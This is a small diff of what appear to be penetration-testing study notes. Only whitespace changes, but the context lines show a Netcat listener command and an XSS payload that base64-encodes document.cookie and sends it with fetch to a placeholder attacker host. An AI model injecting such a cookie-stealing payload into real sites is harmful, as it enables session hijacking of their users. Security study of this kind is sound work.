@@ -25,8 +25,6 @@ nc -l -p 9001
     "To avoid the resolution of hostnames via DNS, we can add -n; moreover, to discover any errors, running Netcat in verbose mode by adding the -v option is recommended. ":
         nc -nlvp 9001
     fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );
-        fetch(): make http request
+        fetch(): make http request  
         btoa(): encode with base64 (for transport)
-   
-    
     
